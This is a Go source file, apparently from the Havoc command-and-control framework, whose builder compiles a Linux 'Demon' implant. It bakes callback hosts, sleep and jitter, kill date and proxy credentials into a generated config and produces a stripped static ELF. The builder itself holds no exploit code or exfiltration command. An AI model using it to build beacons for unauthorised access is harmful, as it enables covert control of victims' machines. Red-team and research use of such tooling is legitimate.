package builder

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"

	"Havoc/pkg/common"
	"Havoc/pkg/handlers"
	"Havoc/pkg/logger"
	"Havoc/pkg/utils"
)

// Linux 载荷构建：把 payloads/DemonLinux（Go 源码）复制到临时目录，
// 写入烘焙配置后用本机 Go 工具链静态编译为 ELF。
//
// 与 Windows Demon 不同，Linux Demon 不需要 mingw/nasm；配置通过生成的
// config_gen.go 内嵌，因此同一份源码可以生成不同监听器/架构的载荷。

const linuxPayloadDir = "payloads/DemonLinux"

func (b *Builder) buildLinux() bool {
	if b.config.ListenerType != handlers.LISTENER_HTTP {
		b.SendConsoleMessage("Error", "Linux Demon 不支持 SMB pivot 监听器（依赖 Windows 命名管道）；请使用 HTTP/HTTPS，或「HTTP 代理 + 传输中继」")
		return false
	}

	httpCfg, ok := b.config.ListenerConfig.(*handlers.HTTP)
	if !ok {
		b.SendConsoleMessage("Error", "invalid HTTP listener config")
		return false
	}

	goBin := findGoBinary()
	if goBin == "" {
		b.SendConsoleMessage("Error", "Go toolchain not found: set HAVOC_GO=/path/to/go or add go to PATH")
		return false
	}

	goarch := "amd64"
	if b.config.Arch == ARCHITECTURE_X86 {
		goarch = "386"
	}

	srcDir := filepath.Join(utils.GetTeamserverPath(), filepath.FromSlash(linuxPayloadDir))
	dstDir := filepath.Join(b.CompileDir, "DemonLinux")
	if err := copyGoSources(srcDir, dstDir); err != nil {
		b.SendConsoleMessage("Error", "failed to copy Linux demon sources: "+err.Error())
		return false
	}

	if err := os.WriteFile(filepath.Join(dstDir, "config_gen.go"), []byte(b.linuxConfigSource(httpCfg)), 0o600); err != nil {
		b.SendConsoleMessage("Error", "failed to write Linux demon config: "+err.Error())
		return false
	}

	if b.outputPath == "" {
		b.SetOutputPath(filepath.Join(b.CompileDir, "demon.elf"))
	}

	args := []string{"build", "-trimpath", "-ldflags", "-s -w", "-o", b.outputPath, "."}
	cmd := exec.Command(goBin, args...)
	cmd.Dir = dstDir
	cmd.Env = linuxBuildEnv(goarch, dstDir)

	var stdout, stderr strings.Builder
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	if !b.silent {
		b.SendConsoleMessage("Info", fmt.Sprintf("compiling Linux demon (%s) with %s", goarch, goBin))
	}

	if err := cmd.Run(); err != nil {
		logger.Error("Linux build failed: " + err.Error())
		if !b.silent {
			b.SendConsoleMessage("Error", "Linux build failed: "+err.Error())
			if msg := strings.TrimSpace(stderr.String()); msg != "" {
				b.SendConsoleMessage("Error", msg)
			}
			if msg := strings.TrimSpace(stdout.String()); msg != "" {
				b.SendConsoleMessage("Info", msg)
			}
		}
		return false
	}

	if st, err := os.Stat(b.outputPath); err != nil || st.Size() == 0 {
		b.SendConsoleMessage("Error", "Linux build produced no output")
		return false
	}

	if !b.silent {
		b.SendConsoleMessage("Info", "finished compiling Linux demon")
	}

	return true
}

// findGoBinary 依次尝试 HAVOC_GO、PATH、项目内置工具链。
func findGoBinary() string {
	if v := os.Getenv("HAVOC_GO"); v != "" {
		if st, err := os.Stat(v); err == nil && !st.IsDir() {
			return v
		}
	}
	if p, err := exec.LookPath("go"); err == nil {
		return p
	}
	root := utils.GetTeamserverPath()
	for _, candidate := range []string{
		filepath.Join(root, "..", "toolchain", "go", "bin", "go"),
		filepath.Join(root, "data", "go", "bin", "go"),
	} {
		if st, err := os.Stat(candidate); err == nil && !st.IsDir() {
			if abs, err := filepath.Abs(candidate); err == nil {
				return abs
			}
			return candidate
		}
	}
	return ""
}

func linuxBuildEnv(goarch, srcDir string) []string {
	drop := map[string]bool{
		"GOOS": true, "GOARCH": true, "CGO_ENABLED": true,
		"GOPROXY": true, "GOFLAGS": true, "GOTOOLCHAIN": true,
	}
	env := make([]string, 0, len(os.Environ())+6)
	for _, kv := range os.Environ() {
		key := kv
		if idx := strings.IndexByte(kv, '='); idx >= 0 {
			key = kv[:idx]
		}
		if drop[key] {
			continue
		}
		env = append(env, kv)
	}
	env = append(env,
		"GOOS=linux",
		"GOARCH="+goarch,
		"CGO_ENABLED=0",
		"GOPROXY=off",
		"GOFLAGS=-mod=mod",
		"GOTOOLCHAIN=local",
	)
	if os.Getenv("GOCACHE") == "" {
		// 优先复用项目内置的 Go 构建缓存（toolchain/gocache），否则退回临时目录。
		cache := filepath.Join(utils.GetTeamserverPath(), "..", "toolchain", "gocache")
		if st, err := os.Stat(cache); err != nil || !st.IsDir() {
			cache = filepath.Join(os.TempDir(), "havoc-go-cache")
			_ = os.MkdirAll(cache, 0o755)
		}
		env = append(env, "GOCACHE="+cache)
	}
	return env
}

func copyGoSources(srcDir, dstDir string) error {
	entries, err := os.ReadDir(srcDir)
	if err != nil {
		return err
	}
	if err := os.MkdirAll(dstDir, 0o755); err != nil {
		return err
	}
	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		name := entry.Name()
		if name != "go.mod" && filepath.Ext(name) != ".go" {
			continue
		}
		data, err := os.ReadFile(filepath.Join(srcDir, name))
		if err != nil {
			return err
		}
		if err := os.WriteFile(filepath.Join(dstDir, name), data, 0o600); err != nil {
			return err
		}
	}
	return nil
}

// linuxConfigSource 生成 config_gen.go。所有字符串走 Go 字面量转义。
func (b *Builder) linuxConfigSource(cfg *handlers.HTTP) string {
	sleep := 2
	jitter := 15
	if v, ok := b.config.Config["Sleep"].(string); ok {
		if n, err := strconv.Atoi(v); err == nil {
			sleep = n
		}
	}
	if v, ok := b.config.Config["Jitter"].(string); ok {
		if n, err := strconv.Atoi(v); err == nil {
			jitter = n
		}
	}

	port := cfg.Config.PortConn
	if port == "" {
		port = cfg.Config.PortBind
	}
	portNum, _ := strconv.Atoi(port)

	var hosts []string
	for _, h := range cfg.Config.Hosts {
		host := h
		hostPort := portNum
		if idx := strings.LastIndex(h, ":"); idx > 0 {
			if p, err := strconv.Atoi(h[idx+1:]); err == nil {
				host = h[:idx]
				hostPort = p
			}
		}
		if host == "" {
			continue
		}
		hosts = append(hosts, fmt.Sprintf("{Host: %q, Port: %d}", host, hostPort))
	}
	if len(hosts) == 0 {
		hosts = append(hosts, fmt.Sprintf("{Host: %q, Port: %d}", cfg.Config.HostBind, portNum))
	}

	uris := cfg.Config.Uris
	if len(uris) == 0 {
		uris = []string{"/"}
	}
	uriLiterals := make([]string, 0, len(uris))
	for _, u := range uris {
		uriLiterals = append(uriLiterals, strconv.Quote(u))
	}

	headers := cfg.Config.Headers
	if len(headers) == 0 {
		headers = []string{"Content-type: */*"}
	}
	if cfg.Config.HostHeader != "" {
		headers = append(append([]string{}, headers...), "Host: "+cfg.Config.HostHeader)
	}
	headerLiterals := make([]string, 0, len(headers))
	for _, h := range headers {
		headerLiterals = append(headerLiterals, strconv.Quote(h))
	}

	rotation := "round-robin"
	switch cfg.Config.HostRotation {
	case "random":
		rotation = "random"
	}

	proxyPort := 0
	if cfg.Config.Proxy.Port != "" {
		proxyPort, _ = strconv.Atoi(cfg.Config.Proxy.Port)
	}

	killDate := cfg.Config.KillDate
	workingHours, err := common.ParseWorkingHours(cfg.Config.WorkingHours)
	if err != nil {
		logger.Debug("Linux payload: invalid working hours, defaulting to 0: " + err.Error())
		workingHours = 0
	}

	return fmt.Sprintf(`// Code generated by Havoc teamserver. DO NOT EDIT.

package main

var baked = BuildConfig{
	Hosts: []HostPort{%s},
	Secure:       %v,
	Method:       "POST",
	UserAgent:    %q,
	Headers:      []string{%s},
	Uris:         []string{%s},
	HostRotation: %q,
	Sleep:        %d,
	Jitter:       %d,
	KillDate:     %d,
	WorkingHours: %d,

	ProxyEnabled:  %v,
	ProxyType:     %q,
	ProxyHost:     %q,
	ProxyPort:     %d,
	ProxyUsername: %q,
	ProxyPassword: %q,
}
`,
		strings.Join(hosts, ", "),
		cfg.Config.Secure,
		cfg.Config.UserAgent,
		strings.Join(headerLiterals, ", "),
		strings.Join(uriLiterals, ", "),
		rotation,
		sleep,
		jitter,
		killDate,
		workingHours,
		cfg.Config.Proxy.Enabled,
		cfg.Config.Proxy.Type,
		cfg.Config.Proxy.Host,
		proxyPort,
		cfg.Config.Proxy.Username,
		cfg.Config.Proxy.Password,
	)
}
